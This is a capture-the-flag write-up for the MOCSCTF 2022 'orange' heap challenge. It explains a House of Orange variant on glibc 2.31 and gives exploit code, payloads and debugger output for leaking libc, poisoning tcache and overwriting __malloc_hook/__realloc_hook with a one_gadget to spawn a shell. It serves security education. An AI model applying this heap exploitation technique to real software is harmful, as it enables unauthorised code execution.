# mocsctf2022.mocsctf.com - orange

### Reference source

https://1ce0ear.github.io/2017/11/26/study-house-of-orange/

https://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html

https://github.com/shellphish/how2heap

https://dystopia.sg/seccon-beginners-2021-freeless/

---

Origin challenge link: https://mocsctf2022.mocsctf.com/challenges

You can also download challenge in my repo: [orange.zip](orange.zip)

There will be 2 files in zip:

- freefree

- libc-2.31.so

Download zip, then extract and use `pwninit` to patch libc to challenge file. And now let's start!

# 1. Find bug

First, we use `file` command to check for basic infomation:

```
$ file freefree
freefree: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=88c0525daecc504cb81ee1e9104e218cfa4ffdc6, for GNU/Linux 3.2.0, not stripped
```

This is a 64-bit file without being stripped. Next, we will use `checksec` to check for all security of challenge file:

```
$ checksec freefree
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Well, it's `PIE enabled`, quite hard for us when we need to debug things. Also `NX enabled` which means we cannot get our shellcode on stack works. 

Finally, let's fire up ghidra and get the main flow of program. There are just 1 interesing function is main() with 4 option `malloc`, `gets` which we input to chunk, `puts` which print out data of that chunk terminated by null-byte and `exit`.

Let's run the program to get it easily. At the menu, we can see things like this:

![menu.png](images/menu.png)

It tells us that we could use a technique called [House of Orange](https://github.com/shellphish/how2heap/blob/master/glibc_2.23/house_of_orange.c). Analizing in ghidra and run in terminal, we know that it can take the variable name from `A` to `Z` by getting its index:

![variable.png](images/variable.png)

So that `X` can be from `A` to `Z`:

![input_var_terminal.png](images/input_var_terminal.png)

This means we can contain and control upto 25 chunk. And one more thing we can notice is that with each chunk, we can write unlimited data to that chunk, hence overwrite the next chunk --> **Heap Overflow**:

![gets_main.png](images/gets_main.png)

And that's all we can find, just 25 chunks with **Heap Overflow** and no free(), let's see the magic right now!

# 2. Brainstorming

If you are not familiar with heap, just read this to know about all kinds of chunk: https://guyinatuxedo.github.io/25-heap/index.html

### Technique

The main thing to remember is that if we malloc(0x1000) but top chunk size is just 0x300, which means that top chunk cannot satisfy the malloc. Hence, that top chunk will be freed and program will malloc 0x1000 byte on the next page of heap.

```
---------------------                    -----------------------
|    some chunks    |                    |     some chunks     |
---------------------   malloc(0x1000)   -----------------------
| top chunk (0x300) |  --------------->  | freed chunk (0x300) |
---------------------                    -----------------------
| unallocated space |                    | new chunk (0x1000)  |
|                   |                    -----------------------
|                   |                    |    new top chunk    |
---------------------                    -----------------------
```

The other thing is that we can only malloc maximum 0x1000 bytes.

To be clear, we will take this example below. The heap is usually allocated with a top chunk of size 0x21000. So when we malloc a 0x400-byte chunk, the top chunk will split itself and remain `0x21000 - 0x400 = 0x20c00` with the bit `PREV_INUSE` is set:

![Technique_malloc1.png](images/Technique_malloc1.png)

Now we want to malloc maximum 0x1000, so the top chunk size need to be lower than 0x1000 to conduct this technique. Let's assume that we can change the top chunk size by somehow. Because there is a check about the alignment of top chunk so just to make sure that:

```
(top chunk address + top chunk size) % 0x1000 == 0
```

In our example, the size we want to overwrite into is `0xc00`:

![Technique_malloc4.png](images/Technique_malloc4.png)

Address `0x55555555b000` can satisfy the alignment so we will change top chunk size from 0x20c00 to 0xc00 with the `PREV_INUSE` bit is set.

![Technique_malloc2.png](images/Technique_malloc2.png)

So that when we malloc with a large number `malloc(0x1000)`, that top chunk cannot satisfy our malloc. Then that top chunk will be freed without any error:

![Technique_malloc3.png](images/Technique_malloc3.png)

Because top chunk size is 0xc00, which is large. So when top chunk is freed, it goes to unsorted bin. 

So if our top chunk size is small enough, which fit size of tcache, when we use this technique to free the top chunk, it will go to tcache bin. That's sound interesting, right?

- Summary technique:
  1. We can malloc maximum 0x1000 bytes
  2. Malloc chunk larger than top chunk will free that top chunk
  3. Overwriting top chunk size require 2 constraints:
      - The size of top chunk need to be aligned with size of 0x1000</br>
      `(top chunk address + top chunk size) % 0x1000 == 0`
      - The `PREV_INUSE` bit need to be set

### Brainstorming

With the origin House of Orange, it first frees the top chunk, then fake the `_IO_list_all` so that when we malloc again, it will execute `_IO_list_all` with string `/bin/sh`. But that's just for libc <= 2.23 because those libc from >=2.24, the check is changed, faking `_IO_list_all` is not successful anymore.

Because our provided libc is 2.31, we still can free the top chunk. First we make a large top chunk, then free it and we get libc main arena address. Next we will free 2 times with 2 small top chunk. So that those small top chunk can go to tcache bin (libc >=2.28 has tcache enabled).

And then, we abuse the tcache link list by overwriting the forward pointer to whatever we want and we get the shell.

- Summary:
  1. Leak main arena address
  2. Free 2 small chunks
  3. Get shell

# 3. Exploit

### Table of content

  1. [Leak main arena address](#stage-1-leak-main-arena-address-table-of-content)
  2. [Free 2 small chunks](#stage-2-free-2-small-chunks-table-of-content)
  3. [Get shell](#stage-3-get-shell-table-of-content)

---

Before we start our exploitation, I wrote these function to help our exploit more convenient

<details>
<summary>Code snippet</summary>
<p>

```
def getchar(index):
  return string.ascii_uppercase[index]

def malloc(index, num):
  p.sendlineafter(b'> ', '{}=malloc({})'.format(getchar(index), num).encode())

def gets(index, data):
  p.sendlineafter(b'> ', 'gets({})'.format(getchar(index)).encode())
  time.sleep(0.1)
  p.sendline(data)

def puts(index):
  p.sendlineafter(b'> ', 'puts({})'.format(getchar(index)).encode())
  # Receive data outside
```

</p>
</details>

And now let's start!

### Stage 1: Leak main arena address ([Table of content](#table-of-content))

At first, we will need a chunk with index 0 (means `A` because we use the `getchar()` function to turn index to char) with any size so that we can overwrite all the next chunk with just chunk `A`:

```
malloc(0, 0x10)
```

Let's see where our chunk `A` is saved on stack after a first malloc:

```
0x00007ffe68571be0│+0x0000: "A=malloc(16)\n"   ← $rax, $rsp, $rdi
0x00007ffe68571be8│+0x0008: 0x0000000a29363128 ("(16)\n"?)
0x00007ffe68571bf0│+0x0010: 0x0000564641e852a0  →  0x0000000000000000    # Chunk index 0
0x00007ffe68571bf8│+0x0018: 0x0000000000000000
0x00007ffe68571c00│+0x0020: 0x0000000000000000
0x00007ffe68571c08│+0x0028: 0x0000000000000000
0x00007ffe68571c10│+0x0030: 0x0000000000000000
0x00007ffe68571c18│+0x0038: 0x0000000000000000
...
```

So it will save our malloc address from chunk `A` to chunk `Z` down of the stack like that. Let's check the top chunk size:

```
gef➤  x/20xg 0x0000564641e852a0-0x10
0x564641e85290: 0x0000000000000000  0x0000000000000021    <-- Chunk index 0
0x564641e852a0: 0x0000000000000000  0x0000000000000000
0x564641e852b0: 0x0000000000000000  0x0000000000020d51    <-- Top chunk
0x564641e852c0: 0x0000000000000000  0x0000000000000000
0x564641e852d0: 0x0000000000000000  0x0000000000000000
0x564641e852e0: 0x0000000000000000  0x0000000000000000
0x564641e852f0: 0x0000000000000000  0x0000000000000000
0x564641e85300: 0x0000000000000000  0x0000000000000000
0x564641e85310: 0x0000000000000000  0x0000000000000000
0x564641e85320: 0x0000000000000000  0x0000000000000000
```

So our top chunk size now is `0x20d51` with the `PREV_INUSE` bit set. If we want to free that top chunk using the above technique (malloc a chunk larger than top chunk), we need to make our top chunk to be smaller because we can only malloc maximum 0x1000, which means we need to malloc around 20 chunks with size 0x1000. That would be long.

So we will change the top chunk size with the **Heap Overflow** bug. Remember that our top chunk is aligned with 0x1000 so we need to calculate the top chunk size first:

```
0x55fad6324000 - 0x55fad63232b0 = 0xd050
```

So overwriting `0xd051` (with `PREV_INUSE` bit) to top chunk size and malloc `0x1000` byte will free our top chunk. Code:

```
# Change topchunk size
payload = b'\x00'*0x10    # chunk data
payload += b'\x00'*0x8    # Prevsize
payload += p64(0xd51)
gets(0, payload)

# Malloc 0x1000 bytes
malloc(1, 0x1000)
```

After overwrite top chunk size:

```
gef➤  x/10xg 0x0000564641e852a0-0x10
0x564641e85290: 0x0000000000000000  0x0000000000000021
0x564641e852a0: 0x0000000000000000  0x0000000000000000
0x564641e852b0: 0x0000000000000000  0x0000000000000d51
0x564641e852c0: 0x0000000000000000  0x0000000000000000
0x564641e852d0: 0x0000000000000000  0x0000000000000000
```

After malloc(0x1000):

```
gef➤  x/10xg 0x0000564641e852a0-0x10
0x564641e85290: 0x0000000000000000  0x0000000000000021
0x564641e852a0: 0x0000000000000000  0x0000000000000000
0x564641e852b0: 0x0000000000000000  0x0000000000000d31
0x564641e852c0: 0x00007fb00a6b0be0  0x00007fb00a6b0be0
0x564641e852d0: 0x0000000000000000  0x0000000000000000

gef➤  heap bin
────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────
All tcachebins are empty
───────────────────────────── Fastbins for arena 0x7fb00a6b0b80 ─────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
──────────────────────────── Unsorted Bin for arena 'main_arena' ────────────────────────────
[+] unsorted_bins[0]: fw=0x564641e852b0, bk=0x564641e852b0
 →   Chunk(addr=0x564641e852c0, size=0xd30, flags=PREV_INUSE)
[+] Found 1 chunks in unsorted bin.
───────────────────────────── Small Bins for arena 'main_arena' ─────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
───────────────────────────── Large Bins for arena 'main_arena' ─────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.

```

We can see that the top chunk is freed and goes into unsorted bin. At here, the program write libc main arena to that chunk so we can see stuff at that freed top chunk. The address for the malloc(0x1000) is placed in the next page and saved in the stack like this:

```
0x00007ffe68571be0│+0x0000: "B=malloc(4096)\n"   ← $rax, $rsp, $rdi
0x00007ffe68571be8│+0x0008: "(4096)\n"
0x00007ffe68571bf0│+0x0010: 0x0000564641e852a0  →  0x0000000000000000    <-- Chunk index 0
0x00007ffe68571bf8│+0x0018: 0x0000564641ea6010  →  0x0000000000000000    <-- Chunk index 1
0x00007ffe68571c00│+0x0020: 0x0000000000000000
0x00007ffe68571c08│+0x0028: 0x0000000000000000
0x00007ffe68571c10│+0x0030: 0x0000000000000000
0x00007ffe68571c18│+0x0038: 0x0000000000000000
```

So now, let's leak the libc main arena address in the freed top chunk first. To do that, we just simply malloc an amount which is smaller than freed top chunk (which turn into unsorted bin) because malloc() doesn't remove data on that chunk (just free() does), and then print the libc main arena address out (Address changed because I rerun it):

```
malloc(2, 0x100)
puts(2)
```

Running it and we get the libc main arena address leaked:

![libc_main_arena_address_leaked.png](images/libc_main_arena_address_leaked.png)

Stack contain the chunk with index 2:

```
0x00007ffe5fd1bc90│+0x0000: "puts(C)\n"  ← $rax, $rsp, $rdi
0x00007ffe5fd1bc98│+0x0008: 0x00000a2936353200
0x00007ffe5fd1bca0│+0x0010: 0x0000555ddbd4f2a0  →  0x0000000000000000    <-- Chunk index 0
0x00007ffe5fd1bca8│+0x0018: 0x0000555ddbd70010  →  0x0000000000000000    <-- Chunk index 1
0x00007ffe5fd1bcb0│+0x0020: 0x0000555ddbd4f2c0  →  0x00007f416cfea1e0    <-- Chunk index 2
0x00007ffe5fd1bcb8│+0x0028: 0x0000000000000000
0x00007ffe5fd1bcc0│+0x0030: 0x0000000000000000
0x00007ffe5fd1bcc8│+0x0038: 0x0000000000000000
```

Compared with chunk 2 data and we know it's correct. Now we will do a simple calculation to get the offset between that leaked address with libc base address. We can get libc base address using `vmmap` (for gdb-gef I think so)

![vmmap_libc_base.png](images/vmmap_libc_base.png)

So the libc base address is `0x00007f416cdfe000`, the leaked address is `0x00007f416cfea1e0`, the offset will be:

```
0x00007f416cfea1e0 - 0x00007f416cdfe000 = 0x1ec1e0
```

So every time we get the leaked libc main arena address, we just subtract with this offset and we have the libc base address. That's great for now! Let's move on the second stage: Free 2 small chunks!

### Stage 2: Free 2 small chunks ([Table of content](#table-of-content))

Now, we will continue using the above technique to free 2 top chunk with small size. Do you still remember we have already chunk index 1 which in the new page of heap? This time, we will reuse that to overwrite the new top chunk size again. 

Before we do that, let's see the new top chunk size next to chunk 1. Because I re-run program so address changed. This is new stack address:

```
0x00007ffec709f4d0│+0x0000: "puts(C)\n"  ← $rax, $rsp, $rdi
0x00007ffec709f4d8│+0x0008: 0x00000a2936353200
0x00007ffec709f4e0│+0x0010: 0x0000557c12fa02a0  →  0x0000000000000000    <-- Chunk index 0
0x00007ffec709f4e8│+0x0018: 0x0000557c12fc1010  →  0x0000000000000000    <-- Chunk index 1
0x00007ffec709f4f0│+0x0020: 0x0000557c12fa02c0  →  0x00007f5c373161e0    <-- Chunk index 2
0x00007fffcd05f248│+0x0028: 0x0000000000000000
0x00007fffcd05f250│+0x0030: 0x0000000000000000
0x00007fffcd05f258│+0x0038: 0x0000000000000000
```

So new top chunk size now is:

```
gef➤  # x/4xg <chunk index 1> + 0x1000
gef➤  x/4xg 0x000055cb4beae010 + 0x1000
0x557c12fc2010: 0x0000000000000000  0x0000000000020ff1
0x557c12fc2020: 0x0000000000000000  0x0000000000000000
```

We need to make top chunk size smaller such as 0x300, so we need to malloc another chunk with the size `0xcf0` with this calculation:

```
0xff1 - 0x300 - 0xcf1
```

We will want to malloc `0xcf0-0x10` because there is heap metadata, so if we malloc(0xcf0), the total size will be `0xcf0 + 0x10 = 0xd00`:

```
malloc(1, 0xcf0-0x10)
```

Why I use index 1? Just because we don't use those 0x1000 byte of chunk 1 anymore so we reuse index 1 again. After `malloc(1, 0xcf0-0x10)`, the stack where chunk 1 is placed changed:

```
0x00007ffec709f4d0│+0x0000: "B=malloc(3296)\n"   ← $rax, $rsp, $rdi
0x00007ffec709f4d8│+0x0008: "(3296)\n"
0x00007ffec709f4e0│+0x0010: 0x0000557c12fa02a0  →  0x0000000000000000    <-- Chunk index 0
0x00007ffec709f4e8│+0x0018: 0x0000557c12fc2020  →  0x0000000000000000    <-- Chunk index 1
0x00007ffec709f4f0│+0x0020: 0x0000557c12fa02c0  →  0x00007f5c373161e0    <-- Chunk index 2
0x00007ffec709f4f8│+0x0028: 0x0000000000000000
0x00007ffec709f500│+0x0030: 0x0000000000000000
0x00007ffec709f508│+0x0038: 0x0000000000000000
```

Let's check if our top chunk size if changed correctly:

```
gef➤  x/4xg 0x0000557c12fc2020 + (0xcf0 - 0x10)
0x557c12fc2d00: 0x0000000000000000  0x0000000000020301
0x557c12fc2d10: 0x0000000000000000  0x0000000000000000
```

So now we just need to change top chunk size, then malloc(0x1000) again and we have a 0x300-byte chunk is freed:

```
# Change top chunk size
payload = b'\x00'* (0xcf0-0x10)
payload += b'\x00'*8
payload += p64(0x301)               # Remember PREV_INUSE bit
gets(1, payload)

# Trigger to free top chunk
malloc(2, 0x1000)
```

Do you notice why I use chunk 2 to trigger to free top chunk? Because after we trigger that, the top chunk will go to tcache. So with the remain of chunk 1 address, we can control the freed top chunk. 

Running script and we get our first freed chunk in tcache:

![free_topchunk_into_tcache1.png](images/free_topchunk_into_tcache1.png)

So with the chunk 2, we will do the same as chunk 1 to get the second freed chunk:

```
# Change top chunk size to 0x20300
malloc(2, 0xcf0-0x10)

# Overwrite top chunk size to 0x300
payload = b'\x00'* (0xcf0-0x10)
payload += b'\x00'*8
payload += p64(0x301)
gets(2, payload)

# Trigger to free top chunk
malloc(3, 0x1000)
```

And we get the second freed chunk in tcache:

![free_topchunk_into_tcache2.png](images/free_topchunk_into_tcache2.png)

With 2 freed chunk in tcache, we are very closed to the shell. Let's move on final stage: Get shell!

### Stage 3: Get shell ([Table of content](#table-of-content))

This time, we will abuse tcache link list by changing forward pointer to whatever place we want. But first, let's find a one gadget that we can use:

![one_gadget.png](images/one_gadget.png)

We will use the first one, which has constraints is r15 and r12 is null. Because if we changed `__malloc_hook` once, it can hardly be recovered to malloc() again. So this is a one hit one kill situation. 

The idea is to overwrite `__malloc_hook` with realloc() and overwrite `__realloc_hook` with one gadget. The aim is to `pop` null byte to r15 and r12. At the epilouge of realloc(), there is `pop r12` and `pop r15`. So that's why we will jump to realloc first. This is the assembly code of realloc:

```
gef➤  disas realloc
Dump of assembler code for function __GI___libc_realloc:
   0x00007f5c371c8000 <+0>:   endbr64 
   0x00007f5c371c8004 <+4>:   push   r15
   0x00007f5c371c8006 <+6>:   push   r14
   0x00007f5c371c8008 <+8>:   push   r13
   0x00007f5c371c800a <+10>:  push   r12
   0x00007f5c371c800c <+12>:  mov    r12,rsi
   0x00007f5c371c800f <+15>:  push   rbp
   0x00007f5c371c8010 <+16>:  mov    rbp,rdi
   0x00007f5c371c8013 <+19>:  push   rbx
   0x00007f5c371c8014 <+20>:  sub    rsp,0x18
   0x00007f5c371c8018 <+24>:  mov    rax,QWORD PTR [rip+0x14cfc1]        # 0x7f5c37314fe0
   0x00007f5c371c801f <+31>:  mov    rax,QWORD PTR [rax]

   0x00007f5c371c8022 <+34>:  test   rax,rax                             # Check if __realloc_hook is null or not
   0x00007f5c371c8025 <+37>:  jne    0x7f5c371c8260 <__GI___libc_realloc+608>
   
   ...
   
   0x00007f5c371c8260 <+608>: mov    rdx,QWORD PTR [rsp+0x48]
   0x00007f5c371c8265 <+613>: add    rsp,0x18
   0x00007f5c371c8269 <+617>: pop    rbx
   0x00007f5c371c826a <+618>: pop    rbp
   0x00007f5c371c826b <+619>: pop    r12
   0x00007f5c371c826d <+621>: pop    r13
   0x00007f5c371c826f <+623>: pop    r14
   0x00007f5c371c8271 <+625>: pop    r15
   0x00007f5c371c8273 <+627>: jmp    rax

```

So in our case that `__realloc_hook` is not null (we will overwrite with one gadget), it then `pop` and execute the function inside `__realloc_hook`. So if we overwrite `__malloc_hook` with `realloc + 24` (address is `0x00007f5c371c8018`), which means we don't push any register, but we can pop all 6 value on stack in to rbx, rbp, r12, r13, r14, r15, and also the stack didn't change, we can control it more easily. And here is the status of stack:

```
0x00007ffec709f4d0│+0x0000: "D=malloc(4096)\n"   ← $rax, $rsp, $rdi
0x00007ffec709f4d8│+0x0008: "(4096)\n"
0x00007ffec709f4e0│+0x0010: 0x0000557c12fa02a0  →  0x0000000000000000
0x00007ffec709f4e8│+0x0018: 0x0000557c12fc2020  →  0x0000000000000000
0x00007ffec709f4f0│+0x0020: 0x0000557c12fe4020  →  0x0000000000000000
0x00007ffec709f4f8│+0x0028: 0x0000557c13005010  →  0x0000000000000000
0x00007ffec709f500│+0x0030: 0x0000000000000000
0x00007ffec709f508│+0x0038: 0x0000000000000000
```

So if we successfully pop 6 register, those register will be changed! And we know that we can create chunk with index up to 25 so just simply malloc with the larger index, r12 and r15 will contain 0 after that 6 pop. 

And there is one more thing to notice:

```
gef➤  p&__realloc_hook
$1 = (void *(**)(void *, size_t, const void *)) 0x7f5c37315b68 <__realloc_hook>

gef➤  x/xg 0x7f5c37315b68
0x7f5c37315b68 <__realloc_hook>:  0x00007f5c371c7bf0

gef➤  x/xg 0x7f5c37315b68 + 0x8
0x7f5c37315b70 <__malloc_hook>: 0x0000000000000000

gef➤  x/2xg 0x7f5c37315b68
0x7f5c37315b68 <__realloc_hook>:  0x00007f5c371c7bf0  0x0000000000000000
                                  (__realloc_hook)     (__malloc_hook)
```

That means `__realloc_hook` and `__malloc_hook` is next to each other. So we can overwrite 2 of them at the same time easily. So that's the idea. Now we start our final stage!

At the stage 2, we have chunk index 2 has size of 0xcf0, next to chunk 2 is the freed top chunk contain the forward pointer and backward pointer due to tcache link list:

```
gef➤  x/10xg 0x0000557c12fe4020 - 0x10
0x557c12fe4010: 0x0000000000000000  0x0000000000000cf1    <-- Chunk index 2
0x557c12fe4020: 0x0000000000000000  0x0000000000000000
0x557c12fe4030: 0x0000000000000000  0x0000000000000000
0x557c12fe4040: 0x0000000000000000  0x0000000000000000
0x557c12fe4050: 0x0000000000000000  0x0000000000000000

gef➤  x/10xg 0x0000557c12fe4020 - 0x10 + 0xcf0
0x557c12fe4d00: 0x0000000000000000  0x00000000000002e1    <-- Second freed top chunk
0x557c12fe4d10: 0x0000557c12fc2d10  0x0000557c12fa0010
0x557c12fe4d20: 0x0000000000000000  0x0000000000000000
0x557c12fe4d30: 0x0000000000000000  0x0000000000000000
0x557c12fe4d40: 0x0000000000000000  0x0000000000000000
```

Notice that the freed top chunk size changed to `0x2e1`. So now we overwrite forward pointer with `__realloc_hook`, just keep the same size as `0x2e0` to make sure there's no error (address changed):

```
payload = b'\x00'* (0xcf0-0x10)
payload += b'\x00'*8    # Prevsize
payload += p64(0x2e1)
payload += p64(libc.sym['__realloc_hook'])
gets(2, payload)
```

And then we just malloc 2 chunk with the same size `0x2e0`, we will get the second chunk is `__realloc_hook` address:

```
malloc(3, 0x2e0-0x10)
malloc(3, 0x2e0-0x10)
```

We can see the `__realloc_hook` address is saved on stack:

```
0x00007ffcd4968f70│+0x0000: "D=malloc(720)\n"  ← $rax, $rsp, $rdi
0x00007ffcd4968f78│+0x0008: 0x00000a2930323728 ("(720)\n"?)
0x00007ffcd4968f80│+0x0010: 0x0000559462b382a0  →  0x0000000000000000    <-- Chunk index 0
0x00007ffcd4968f88│+0x0018: 0x0000559462b5a020  →  0x0000000000000000    <-- Chunk index 1
0x00007ffcd4968f90│+0x0020: 0x0000559462b7c020  →  0x0000000000000000    <-- Chunk index 2
0x00007ffcd4968f98│+0x0028: 0x00007f6549689b68  →  0x00007f654953bbf0  →  <realloc_hook_ini+0> endbr64 
0x00007ffcd4968fa0│+0x0030: 0x0000000000000000
0x00007ffcd4968fa8│+0x0038: 0x0000000000000000
```

So we successfully malloc with `__realloc_hook`. Now we just need to change value of `__realloc_hook` and `__malloc_hook` and that's the easiest part in the world. Remember that we will write address of `realloc + 24` to `__malloc_hook` so it just pop, not push and the stack is remain until 6 `pop`, also the constraints is satisfied:

```
payload = p64(libc.address + 0xe6aee)
payload += p64(libc.sym['realloc'] + 24)
gets(3, payload)

malloc(4, 0x10)
```

Running script and stop before first `pop`, the stack look like this

```
0x00007ffc992c5ed0│+0x0000: 0x0000556efad732a0  →  0x0000000000000000    <-- Chunk index 0
0x00007ffc992c5ed8│+0x0008: 0x0000556efad95020  →  0x0000000000000000    <-- Chunk index 1
0x00007ffc992c5ee0│+0x0010: 0x0000556efadb7020  →  0x0000000000000000    <-- Chunk index 2
0x00007ffc992c5ee8│+0x0018: 0x00007fa6716c4b68  →  0x00007fa6715bfaee  →  <execvpe+638> mov rdx, r12
0x00007ffc992c5ef0│+0x0020: 0x0000000000000000
0x00007ffc992c5ef8│+0x0028: 0x0000000000000000
0x00007ffc992c5f00│+0x0030: 0x0000000000000000
0x00007ffc992c5f08│+0x0038: 0x0000000000000000
```

The assembly code at pop look like this:

```
gef➤  x/10i $rip
=> 0x7fa671577269 <__GI___libc_realloc+617>:  pop    rbx
   0x7fa67157726a <__GI___libc_realloc+618>:  pop    rbp
   0x7fa67157726b <__GI___libc_realloc+619>:  pop    r12
   0x7fa67157726d <__GI___libc_realloc+621>:  pop    r13
   0x7fa67157726f <__GI___libc_realloc+623>:  pop    r14
   0x7fa671577271 <__GI___libc_realloc+625>:  pop    r15
   0x7fa671577273 <__GI___libc_realloc+627>:  jmp    rax
```

Just 6 pop, if we increase the index of chunk a bit, we can get r12 and r15 null easily. So we will add a variable called `n` plus with all index to increase the index, this is more effective way than changing index one by one, it can make you confused.

For example, with the `gets(3, payload)` at the end, we will change it to `gets(3+n, payload)` and with n can be changed. I will choose `n=10` and new index will be 10, 11, 12, 13 and 14. That's the perfect index and we now get the shell.

Full code: [solve.py](solve.py)

# 4. Get flag

![get_flag.png](images/get_flag.png)

Flag is `MOCSCTF{Fr33_@nd_Fr3E_1s_n07_3@5y}`